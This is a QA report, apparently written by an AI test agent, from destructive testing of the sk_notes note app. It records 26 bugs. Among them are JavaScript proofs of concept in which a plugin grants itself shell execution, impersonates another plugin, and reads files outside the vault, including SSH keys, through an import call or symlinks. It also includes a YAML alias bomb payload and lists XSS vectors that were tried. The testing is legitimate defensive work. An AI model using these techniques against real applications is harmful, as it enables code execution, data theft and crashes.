# sk_notes – QA cycle 1 – Agent B (destructive tester)

- **Date:** 2026-10-31 / 2026-11-01
- **Environment:** Debian 13 VM, kernel 6.12.95, 1 CPU, 1.7 GB RAM (+1.8 GB swap), Python 3.13.5,
  Qt 6.8.2 / PyQt6 6.9.0, Xvfb. App started from the working tree (`main.py --vault …`) through
  `qa/cdp.py` (isolated `XDG_*` homes, CDP ports 9551–9566). Every run with a risk of runaway memory
  was wrapped in `systemd-run --user --scope -p MemoryMax=700M -p MemorySwapMax=100M` so the
  machine (shared with agent A and Ollama) never swapped hard.
- **Scripts:** all under `qa/tmp/agent-B/` (helpers in `lib.py`); scratch vaults and app homes under
  `qa/tmp/agent-B/work/` (log of a run: `work/home-<name>/cache/sk_notes/sk_notes.log`).
  Run any script as `cd qa/tmp/agent-B && systemd-run --user --scope -q -p MemoryMax=700M python3 -u <script> [args]`.
- **Covered:** all 9 attack areas of the brief (malformed Markdown, file names, renames, external
  changes, SIGKILL, Ollama absent/slow/hanging, plugins + permission holes, filesystem permissions,
  memory). Disk-full: **not tested** (needs a small filesystem: no sudo, no loop/tmpfs mount possible).
- **Result:** 26 bugs — 11 critical, 3 high, 7 medium, 4 low, 1 cosmetic.

| # | Severity | Title |
|---|---|---|
| B-1 | critical | Any plugin acts as the app by omitting `plugin=`: grants itself permissions, installs/enables plugins |
| B-2 | critical | Plugin impersonation: `plugin=<other id>` uses another plugin's permissions (exec) |
| B-3 | critical | `system.importFiles` copies any file from outside the vault, no permission check |
| B-4 | critical | Symlinks inside the vault bypass `fs-outside-vault` (read and write) |
| B-5 | critical | Obsidian-API writes (`app.vault.adapter`) are not attributed: plugins write `.sk_notes/*` |
| B-6 | critical | Switching notes rewrites unedited notes: binary bytes → U+FFFD, CRLF → LF (history keeps only the corrupted copy) |
| B-7 | critical | Opening an unreadable note shows the previous note; autosave writes it over the unreadable note |
| B-8 | critical | After one edit conflict, editors stop reloading external changes; next keystroke silently overwrites them |
| B-9 | critical | 302-byte YAML alias bomb in frontmatter → OOM, app never starts |
| B-10 | critical | Symlink loops (`a -> .`, `b -> .`) in the vault → OOM at start-up or when created at run time |
| B-11 | critical | Read-only vault → crash at start-up (traceback, no window) |
| B-12 | high | Autosave never fires while the user keeps typing: SIGKILL/crash loses everything typed |
| B-13 | high | Crash during a folder rename leaves thousands of broken links, no recovery on restart |
| B-14 | high | Notes whose names are Unicode-NFD (macOS/sync) cannot be opened |
| B-15 | medium | SKAI cancel/Stop does nothing while Ollama's stream is stalled (up to 600 s) |
| B-16 | medium | External rename of an open, dirty note → tab closes and the text is saved under the old name (duplicate) |
| B-17 | medium | Read-only (0444) notes are silently overwritten |
| B-18 | medium | Names of ~241–255 bytes: notes cannot be saved / created |
| B-19 | medium | A plugin whose `onload()` never resolves blocks all following plugins and the "ready" phase, silently |
| B-20 | medium | Looping or memory-hogging plugin freezes/OOMs the app at every start; no safe mode to recover |
| B-21 | medium | Page/plugins reach any localhost service without the network permission |
| B-22 | low | Deeply nested one-line list → "CodeMirror plugin crashed: Maximum call stack size exceeded" |
| B-23 | low | Slow open/render of pathological notes (up to 17 s open / 25 s reading view) |
| B-24 | low | `~/.config/skorpion-suite/settings.json` read from `$HOME`, `XDG_CONFIG_HOME` ignored |
| B-25 | low | Raw `OSError` texts shown to the user (move folder into itself, over-long name) |
| B-26 | cosmetic | see "Cosmetic issues" |

---

## Plugin permission system

Test harness: `t_security.py` + `evil_plugin.js`. The plugin `evil` has **every permission pre-set to
`deny`** in `.sk_notes/permissions.json`; a second plugin `trusted` (disabled) has `exec: allow`.
`outside/` is a folder outside the vault containing `secret.txt` / `victim.txt`; the vault contains
`outlink -> outside/`, `secretlink.md -> outside/secret.txt`, `victimlink.md -> outside/victim.txt`.
Each probe logs `PROBE <name> {result}` in the app log (`work/home-sec/cache/sk_notes/sk_notes.log`).
Plugins run in the page context, so everything below is plain JavaScript inside `main.js`.

### B-1: Any plugin can act as the app by calling `skn://api/*` without the `plugin=` parameter
**Severity:** critical (permission bypass → arbitrary code execution)

The plugin identity is only the `?plugin=<id>` query parameter that the shim adds
(`bridge.py: Ctx(plugin=q.get("plugin"))`). Every check is `if ctx.plugin: …`, so a plugin that calls
`fetch('skn://api/…')` itself, without the parameter, is treated as sk_notes.

**Steps:** `python3 -u t_security.py` (or in any enabled plugin):
```js
async function api(m, params, plugin) { const b = new TextEncoder().encode(JSON.stringify(params));
  return (await fetch('skn://api/' + m + '?len=' + b.length + (plugin ? '&plugin=' + plugin : ''), {method: 'POST', body: b})).json(); }
await api('plugins.permissions', { id: 'evil', set: { exec: 'allow' } });           // grant itself exec
await api('shim.exec', { cmd: 'sh', args: ['-c', 'echo SELFGRANT > /…/outside/exec-selfgrant.txt'] }, 'evil');
await api('config.write', { name: 'probe.json', data: {a: 1} });                    // any .sk_notes config
await api('vault.write', { path: '.sk_notes/app.json.probe', data: 'x' });
await api('plugins.installFolder', { path: '/…/outside/dropper' });                  // install a new plugin
await api('plugins.setEnabled', { id: 'dropper', enabled: true });                  // and enable it
await api('system.openExternal', { url: 'http://127.0.0.2:18555/x' });              // open-external was "deny"
```
**Expected:** all refused (`permission-denied`); permissions can only be changed by the user in Settings.
**Actual:** all succeed. Log:
```
PROBE perm_selfgrant {"ok":true,"v":{"fs-outside-vault":"deny","exec":"allow",...}}
PROBE exec_after_selfgrant {"ok":true,"v":0}
PROBE api_config_write_noplugin {"ok":true,"v":true}
PROBE installFolder_noplugin {"ok":true,"v":{"id":"dropper",...}}
PROBE enable_noplugin {"ok":true,"v":["evil","dropper"]}
PROBE openExternal_noplugin {"ok":true,"v":true}
```
On disk: `permissions.json` now says `"evil": {"exec": "allow", …}`, `outside/exec-selfgrant.txt`
contains `SELFGRANT`, `community-plugins.json` = `["evil","dropper"]`, the fake `xdg-open` logged
`xdg-open http://127.0.0.2:18555/open-external-noplugin`. The same trick can grant `network` and
`fs-outside-vault`, so the whole permission system is advisory.

### B-2: A plugin can borrow another plugin's permissions with `plugin=<other id>`
**Severity:** critical
**Steps:** `t_security.py`; from `evil`: `api('shim.exec', {cmd: 'sh', args: ['-c', 'id; echo IMPERSONATED > …/outside/exec-impersonate.txt']}, 'trusted')`.
`trusted` is not even enabled.
**Expected:** denied – `evil` has `exec: deny`.
**Actual:** runs: `PROBE exec_impersonate {"ok":true,"v":{"code":0,"stdout":"dWlkPTEwMDAo…` (`uid=1000(kadmin)…`),
file `outside/exec-impersonate.txt` = `IMPERSONATED`.

### B-3: `system.importFiles` reads any file outside the vault without `fs-outside-vault`
**Severity:** critical
**Steps:** `t_security.py`; even with the honest id: `api('system.importFiles', {files: ['/…/outside/secret.txt'], folder: ''}, 'evil')`, then read the copy with `app.vault`.
**Expected:** `permission-denied` (fs-outside-vault is deny).
**Actual:** `PROBE api_importFiles_outside {"ok":true,"v":["secret.txt"]}`; `v-sec/secret.txt` = `TOP SECRET outside the vault`.
Works for any readable file (`~/.ssh/id_*`, keyring files…). `system.openPath`/`showInFolder`/`pickFiles` likewise have no plugin check (not exploited further).

### B-4: Symlinks inside the vault bypass `fs-outside-vault` (read and write)
**Severity:** critical
`shim.fs` uses `os.path.normpath` (no symlink resolution) and `Vault.abs()` explicitly accepts a
symlinked parent, so paths through a symlink are "inside the vault".
**Steps:** `t_security.py` (vault contains `outlink -> ../outside`, `secretlink.md -> ../outside/secret.txt`):
```js
await fs.promises.readFile('outlink/secret.txt', 'utf8');           // read outside
await fs.promises.writeFile('outlink/pwned-fs.txt', 'pwned');        // write outside
await this.app.vault.adapter.write('outlink/pwned-adapter.txt', 'x'); // write outside via Obsidian API
await fs.promises.readFile('secretlink.md', 'utf8');
```
**Expected:** denied (the target is outside the vault) – absolute paths and `../` are correctly denied.
**Actual:** `fs_symlinkdir_read`, `fs_symlinkdir_write`, `fs_symlinkfile_read`, `adapter_write_symlinkdir`
all `ok:true`; `outside/pwned-fs.txt` and `outside/pwned-adapter.txt` were created. A plugin cannot
create symlinks itself, but symlinked folders are common in real vaults (and B-1 gives exec anyway).

### B-5: Obsidian-API calls through `app.vault`/`adapter` are not attributed to the plugin
**Severity:** critical
**Steps:** `t_security.py`: `await this.app.vault.adapter.write('.sk_notes/permissions.json.probe', 'x')`.
**Expected:** `permission-denied` (docs/api.md: "Plugins can never write into `.sk_notes` outside their own folder"); `fs.writeFile('.sk_notes/permissions.json')` is correctly denied.
**Actual:** `PROBE adapter_write_permissions {"ok":true,…}`; `.sk_notes/permissions.json.probe` exists. The
shared `app` object calls the API without a plugin id, so any plugin can overwrite
`.sk_notes/permissions.json`, `app.json` (turn restricted mode off), `community-plugins.json`
and other plugins' code with ordinary Obsidian API calls.

---

## Data loss / corruption

### B-6: Switching to another note rewrites the previous, unedited note (binary → U+FFFD, CRLF → LF)
**Severity:** critical (data loss)
**Steps:** `python3 -u t_silent_rewrite.py`: vault with `binary.md` (bytes 0–255 + random), `crlf.md`
(`line1\r\nline2\r\n…`), `mixed-eol.md`, `cr-only.md`; open each note in turn in the same tab
(`app.workspace.openFile`), toggle Ctrl+E twice, **type nothing**.
**Expected:** files never touched unless the user edits them.
**Actual:** after visiting the notes:
```
binary.md      CHANGED 17800 -> 34694 bytes; FFFD=8485
crlf.md        CHANGED 21 -> 18 bytes  (b'line1\nline2\nline3\n')
mixed-eol.md   CHANGED 26 -> 24 bytes
cr-only.md     CHANGED 20 -> 20 bytes  (\r → \n)
```
The write happens when the tab switches away (a note is unchanged while it is still open). The note's
history then contains only one `edit` snapshot of the **corrupted** text (34694 bytes): the original
bytes are lost. Same result in the larger run `t_markdown.py` (`binary.md` 200000 → 361920 bytes,
82463 U+FFFD). Any `.md` that is not valid UTF‑8 (Latin‑1 notes from old tools, mis-named binaries)
or uses CRLF (Windows/git `autocrlf` vaults) is rewritten just by browsing.

### B-7: Opening an unreadable note shows the previous note's text and autosave writes it over the note
**Severity:** critical (data loss)
**Steps:** `python3 -u t_perms_fs.py inside`: `unreadable.md` (content `cannot read me`) is `chmod 000`.
Open `ro.md` (content `EDITED # read-only note`), then open `unreadable.md` in the same tab, type `TYPED `.
**Expected:** an error ("cannot read …"), the tab stays empty/read-only, the file is not written.
**Actual:** the tab is labelled `unreadable.md` but shows the **previous note's text**
(`'EDITED # read-only note\n'`), no notice. After typing, the file on disk is
`'TYPED EDITED # read-only note\n'` – its original content is destroyed (atomic replace works
because the folder is writable). Same mechanism likely for any read error (I/O error, file vanished
during load).

### B-8: After one edit conflict, open notes stop reloading external changes; the next keystroke overwrites them silently
**Severity:** critical (silent loss of another program's changes)
**Steps:** `python3 -u t_stale_editor.py conflict`:
1. open `Other.md`, type, and change it from the shell within the autosave delay → the conflict
   notice appears (correct: "Other was changed outside sk_notes while you were editing…");
2. open `Note.md`, wait 2 s, from the shell append `IMPORTANT LINE ADDED BY SYNC`;
3. wait 10 s (editor still shows the old text), type 3 words.
**Expected:** the editor reloads the external change (it does when step 1 is skipped:
`t_stale_editor.py switch` shows the new line after 1 s), or at least a conflict notice.
**Actual:** editor keeps the old text for good; after typing, disk =
`'# Note (typed by user)\noriginal line\n'` – the synced line is gone, **no notice**. Also seen in
`t_external.py` (A2: clean note `Quick.md` not reloaded; D: `bulk/n7.md` open during a 500-file
git-style replace not reloaded, while the metadata cache was updated).

### B-9: A 302-byte YAML "billion laughs" frontmatter makes the app run out of memory at start-up
**Severity:** critical (crash; a single synced/shared note makes the vault unopenable)
**Steps:** `python3 -u t_startup_vaults.py yamlbomb` – a note with
```
---
a: &a ["x","x","x","x","x","x","x","x","x"]
b: &b [*a,*a,*a,*a,*a,*a,*a,*a,*a]
… (8 levels)
---
```
**Expected:** frontmatter rejected or aliases limited; app starts.
**Actual:** no window; the scope was OOM-killed at 700 MB
(`run-…scope: A process of this unit has been killed by the OOM killer`). Without a cgroup it would
eat all RAM/swap. Offline: `t_parser_mem.py bomb N`: 6 levels 0.65 s / 32 MB, 7 levels 4.2 s / 142 MB,
8 levels → `MemoryError` at a 600 MB limit (`parser.parse` expands aliases with `yaml` SafeLoader).

### B-10: Symlink loops in the vault → unbounded scan → OOM (at start-up and at run time)
**Severity:** critical (crash)
**Steps:** `python3 -u t_startup_vaults.py symloop` (vault with `loopA -> .`, `loopB -> .`,
`sub/up -> ..`); and `python3 -u t_external.py symloop` (the two links are created while the app runs).
**Expected:** symlinked folders already visited are skipped (or symlinked folders not followed).
**Actual:** start-up: nothing logged after start, OOM-killed at 700 MB after ~80 s. Run time: right
after creating the links the app stops answering and is OOM-killed. `Vault.scan()` follows directory
symlinks (`e.stat()` + `S_ISDIR`) with no visited set: with two loops the tree grows as 2^depth.

### B-11: Vault on a read-only folder → crash at start-up
**Severity:** critical (crash)
**Steps:** `python3 -u t_perms_fs.py rovault` (vault with existing `.sk_notes/`, then `chmod -R a-w`).
**Expected:** opens read-only, or a clear message.
**Actual:** process exits before the window; stdout:
```
WARNING sk_notes.core.index: cache …/.sk_notes/cache.db unusable (unable to open database file)
Traceback … main.py line 91 … index.py line 88 in connect
sqlite3.OperationalError: unable to open database file
```

### B-12: Autosave never fires while the user keeps typing – a crash loses all of it
**Severity:** high
**Steps:** `python3 -u t_kill2.py typing`: type a word every 0.25 s for 20 s, then SIGKILL the process group.
**Expected:** autosave with a maximum delay (e.g. save at least every few seconds while typing).
**Actual:** words on disk while typing: `[(5 s, 0), (10 s, 0), (15 s, 0)]`; after SIGKILL: 0 of 78 words.
`t_kill.py` (3 runs, 2–5 s typing + kill 0–1.2 s later): 0 words saved each time. The 1 s
debounce restarts on every key, so a fast typist who never pauses for 1 s loses the whole session
on a crash/power loss.

### B-13: Killing the app during a folder rename leaves thousands of broken links, no repair on restart
**Severity:** high
**Steps:** `python3 -u t_kill2.py rename`: folder `F/` with 1000 notes, `refs/` with 1000 notes linking
2000× into `F/`; `renameFile(F → G)`; SIGKILL after 8 / 11 / 14 s (the full rename takes ~16 s); restart.
**Expected:** atomic operation, or a journal that completes/rolls back on next start.
**Actual:**
```
kill 8s:  F gone, G exists; links in refs/: [[F/ x1782, [[G/ x218  → after restart: 2663 unresolved links
kill 11s: [[F/ x1510, [[G/ x490 → 2229 unresolved
kill 14s: [[F/ x1228, [[G/ x772 → 1829 unresolved
```
No notice; the user has to fix the links by hand (snapshots are in history, one per note). Killing
at 4 s is safe (nothing moved yet).

### B-14: Notes whose names are in Unicode NFD cannot be opened
**Severity:** high (macOS/Syncthing/Nextcloud vaults commonly contain NFD names)
**Steps:** `python3 -u t_names2.py` – vault with `unicodedata.normalize('NFD', 'Café résumé.md')`.
**Expected:** the note opens like any other.
**Actual:** it is listed (path in NFD), but `app.vault.getAbstractFileByPath(<listed path>)` returns
`null`, clicking it in the file explorer opens nothing (`markdown leaves = []`), no notice. The
front end normalizes lookups to NFC while the scanner keeps the on-disk NFD name.

---

## Medium

### B-15: SKAI Stop/cancel does nothing while the Ollama stream is stalled
**Severity:** medium
**Steps:** `python3 -u t_ollama.py stall` (fake Ollama `fakeollama.py 18601 stall`: `/api/tags` OK,
`/api/chat` sends headers and then nothing; `HOME` points to an isolated folder with
`.config/skorpion-suite/settings.json`). Start a chat (`app.skai.chat`), cancel after 4 s; run
"SKAI: Summarize" and click **Stop** in the panel.
**Expected:** cancel ends the request within a second, panel back to "Send".
**Actual:** no `cancelled` event 60 s after cancel; 15 s after clicking Stop the panel still shows only
"Summary: Note" and the **Stop** button; 4 TCP connections to the fake server stay open. The worker
only checks the cancel flag between streamed chunks, and the read timeout is
`INACTIVITY_TIMEOUT = 600` s. With `slow` mode (1 token / 10 s) cancel takes effect only at the next
token (cancel at 4.5 s → `cancelled` at 10.4 s). The rest of the UI stays responsive and no note is changed.

### B-16: External rename of an open, dirty note duplicates it
**Severity:** medium
**Steps:** `python3 -u t_external.py` step C: open `Ren.md`, type `TYPED-BEFORE-EXT-RENAME`, immediately
`mv Ren.md Ren-moved.md` from the shell.
**Expected:** the tab follows the file (or asks), one note.
**Actual:** the tab closes (`['empty', None]`), the pending text is saved to a **re-created `Ren.md`**:
`Ren.md = '# Ren\nTYPED-BEFORE-EXT-RENAME'`, `Ren-moved.md = '# Ren\n'` – two diverging copies.
(Same for an external delete, step B: the deleted note comes back with the typed text; acceptable,
but the tab is closed without notice.)

### B-17: Read-only notes (mode 0444) are silently overwritten
**Severity:** medium
**Steps:** `t_perms_fs.py inside`: `chmod 444 ro.md`, edit, Ctrl+S.
**Expected:** "note is read-only" and no write (as `vim`/text editors warn).
**Actual:** disk = `'EDITED # read-only note\n'`, mode still 0444, no notice (atomic rename replaces the file).

### B-18: Notes with names of ~241–255 bytes cannot be saved or created
**Severity:** medium
**Steps:** `python3 -u t_names2.py` (`'L'*250 + '.md'`, 253 bytes) and `t_startup_vaults.py names`
(`'a'*252 + '.md'`): edit + Ctrl+S; `app.vault.create('N'*247 + '.md', 'new')`.
**Expected:** saved (the name is legal, ≤ 255 bytes, and `check_name` accepts it).
**Actual:** notice `Could not save "LLLL…"`, disk unchanged; log
`OSError: [Errno 36] File name too long: '…/.LLLL….skn-tmp-<pid>'` – the temp file name
`.<name>.skn-tmp-<pid>` exceeds 255 bytes. Creating such a note fails with the raw OSError. (233-byte names work.)

### B-19: A plugin whose `onload()` never resolves blocks every later plugin and the app's "ready" phase
**Severity:** medium
**Steps:** `python3 -u t_bad_plugins.py never` – plugins `never-ready` (`onload() { return new Promise(() => {}) }`) then `after-never`.
**Expected:** a timeout/notice; other plugins still load.
**Actual:** `window.__sknReady` stays false, `after-never` never loads, no notice or error; the rest
of the UI works (quick switcher opens). `PluginManager.loadAll` awaits each `plugin.load()` in sequence.

### B-20: A looping or memory-hogging plugin takes the app down at every start; no way to recover from the app
**Severity:** medium
**Steps:** `python3 -u t_plugin_hang.py loop` (`setTimeout(() => { for (;;) {} }, 15000)` in onload) and
`t_plugin_hang.py memory` (allocates 80 MB every 300 ms).
**Expected:** some safe mode (e.g. `--safe-mode`/`--no-plugins`, or "plugins disabled after a crash"), since Settings → restricted mode is unreachable when the UI is frozen.
**Actual:** loop: responsive until t=22 s, then permanently `UNRESPONSIVE` (CDP evaluate times out) until killed at 168 s; the plugin stays enabled, so every restart freezes again; `main.py` only accepts `--vault` and a URI. Memory: renderer grows 86 → 564 MB in 11 s (PSS 878 MB) and the scope is OOM-killed. Recovery requires hand-editing `.sk_notes/community-plugins.json`.

### B-21: The page and plugins can send requests to any localhost service without the network permission
**Severity:** medium
**Steps:** `t_security.py` probe `fetch_localhost_cdp`: `fetch('http://127.0.0.1:9551/json')` from a plugin with `network: deny`.
**Expected:** blocked except the configured Ollama host.
**Actual:** the request reaches the local server (log:
`Access to fetch at 'http://127.0.0.1:9551/json' from origin 'skn://app' has been blocked by CORS policy` –
CORS hides the answer, but the request was delivered). `NetworkGuard` and `shim.request` exempt every
`localhost/127.0.0.1/::1` URL, so plugins can POST to local services (`no-cors` CSRF), and
`requestUrl` (Python side, no CORS) can read their answers. Remote hosts are correctly blocked.

---

## Low

### B-22: Deeply nested one-line list crashes a CodeMirror plugin
**Steps:** `python3 -u t_markdown.py deep-list-1line` (note = `"- " * 10000 + "x"`).
**Actual:** log `WARNING … JS chunk-XGM2AM5Y.js:7 CodeMirror plugin crashed: RangeError: Maximum call stack size exceeded`
(open 10.7 s). The editor keeps working, but that editor plugin is disabled for the session.

### B-23: Very slow open/render of pathological notes
**Steps:** `t_markdown.py` (times per note) and `t_parser_time.py` / `t_parser_mem.py list N` (parser only).
**Actual:** `deep-brackets.md` (180 KB of `[`/`]`/`*`/`<`) open 10–17 s, reading view 10–25 s;
`five-mb-line.md` open 7.7 s; `many-links.md` (10k links) reading view 8.6 s and PSS +140 MB;
parser on nested lists is super-linear: 1000/2000/4000 levels → 1.3/4.6/15.1 s. The UI stays responsive
afterwards; no crash.

### B-24: The suite's Ollama settings are read from `$HOME/.config`, ignoring `XDG_CONFIG_HOME`
`sk_notes/app/config.py`: `SUITE_SETTINGS_FILE = Path.home() / ".config" / "skorpion-suite" / "settings.json"`.
With `XDG_CONFIG_HOME=/x` the file `/x/skorpion-suite/settings.json` is ignored (the Skorpion convention
resolves config through XDG). Found while setting up the Ollama tests; tests had to override `HOME`.

### B-25: Raw internal errors shown to the user
`t_renames.py`: renaming folder `G` into `G/sub/G` → `error: OSError: [Errno 22] Invalid argument: '/…/G' -> '/…/G/sub/G'`
(logged as `ERROR … API vault.rename failed` with traceback). B-18: `OSError: [Errno 36] … .NNNN….skn-tmp-…`.
Read-only folder operations: `permission-denied: [Errno 13] Permission denied: '/…/rodir/.new.md.skn-tmp-42712'`.
Expected: translated messages ("cannot move a folder into itself", "name too long", "folder is read-only").

---

## Attacks that failed (app held up)

- **Script/HTML injection** – none executed (`window.__pwned` stayed null) for: `<script>`, `<img onerror>`,
  `<svg onload>`, `javascript:` Markdown and `<a>` links (clicked), `<iframe srcdoc>`/`src=javascript:`,
  `<details ontoggle>`, `onmouseover` (dispatched), KaTeX `\href{javascript:…}`, Mermaid labels and `click`,
  callout titles, frontmatter title/aliases/tags, wikilink targets/aliases, `<object>`/`<embed>`/`<form>`/`<meta refresh>`.
- Malformed Markdown: unclosed fence (2000 lines), unclosed frontmatter, invalid YAML incl.
  `!!python/object/apply:os.system` (not executed), 1500-level indented list, 10k-level quote,
  zero-width/RTL override/BOM/emoji ZWJ/500 combining marks/Zalgo, NUL bytes, self links, embed cycle
  `a ↔ b`, 300 embeds of a cycle, 10 000 links, 5 MB single line – all opened, no crash, no hang.
- File names: emoji, `#`, `^`, `[ ]`, `|`, `CON`, case-only twins (`case/CASE/Case`), newline and tab
  in names, `<script>.md`, `quote"s'`, `-dash`, 233-byte names – listed, editable and saved to the right file.
  Rename to `../escape.md` / `x/../../escape.md` → `outside-vault`; 300-byte name → `name-too-long`.
- Renames (live app): folder with 1000 notes (16.4 s) – 0 unresolved links, 0 contents changed;
  1000 rename loop `Loop ↔ Loop2` (138 s) – 0 errors, content and backlinks intact, PSS stable,
  history.db 0.27 MB; rename onto an existing name refused; rename while typing – text kept, tab follows.
- External changes: dirty note + external edit → conflict notice, user version kept, external one in
  history; 500 files replaced git-style → cache updated (500 backlinks); 5000 files created at once →
  indexed in 8.6–10.9 s, searchable; file replaced by folder → tree updated, saving the stale tab gives
  `Could not save "Swap": is-a-folder`.
- SIGKILL during typing, during a 1 MB save, during start-up indexing (3× each) and during a rename:
  **no truncated/empty notes, no leftover temp files, `PRAGMA integrity_check` = ok** for cache.db and
  history.db every time; app always restarted (except the data issues in B-12/B-13).
- Ollama absent (port 18999): status "SKAI offline", chat error `unreachable` in 55 ms, panel explains,
  UI responsive. Hanging server: status times out in 4 s, chat error `timeout`; 6 concurrent status
  calls 8 s but search stays instant (thread pool not starved). Garbage stream → "answer could not be read".
  Notes never modified in any mode.
- Plugins: throw in `onload` (sync/async), top-level throw, syntax error → one notice each, others load;
  throwing `onunload` → disables cleanly; 10 000 commands → palette search in 0.3 s, all removed on disable.
- Permission checks that held: `fs` with absolute paths, `../` traversal, `path.resolve('/…')` → EACCES;
  `fs` write to `.sk_notes/permissions.json` and another plugin's folder → EACCES; `child_process` with
  own id → EACCES; `requestUrl` remote → permission-denied; `http://localhost:1@127.0.0.2/` userinfo
  trick → network-error (not reached); remote `fetch`, XHR, `<img>`, WebSocket, iframe → blocked
  (fake remote server log empty); `shell.openExternal` with own id → denied; clipboard read → refused
  by Chromium ("Document is not focused"); `window.require('fs')` inside the vault only.
- Folders: `chmod 000` folder skipped silently; create/move/delete in a read-only folder → error, nothing lost.
- **Memory** (`t_memory.py`, 300-note vault, PSS of python + QtWebEngine processes, after GC):
  baseline 422 MB; open+close 200 note tabs 444 MB (+22); 400 tab switches between 10 tabs 456 MB;
  50× graph open/close 487–497 MB (one-off +30 MB, flat afterwards); 500 search API calls flat at
  482 MB; 100 search-pane queries 484 MB. DOM node count constant per phase. **No leak found.**

## Cosmetic issues

- B-26: in the SKAI panel, when Ollama is offline the message is shown twice in a row
  ("SKAI is offline: the local Ollama service is not reachable…" and, under the action title,
  "SKAI is offline: Ollama is not reachable.") – `t_ollama.py absent`.

## Notes

- One run of `t_security.py` froze the app right after `system.openExternal`/`window.open`; neither call
  froze it when tested alone (`t_hang_open.py window|external`), so it is not filed.
- An unanswered permission dialog (e.g. `window.require('fs')` reading outside the vault asks for
  "unknown-plugin") blocks the whole app including DevTools – expected per the brief, avoided by pre-set answers.
- During testing `/tmp` (a 895 MB tmpfs) filled up with other users' data; all agent‑B data was moved to
  `qa/tmp/agent-B/work/` on disk.
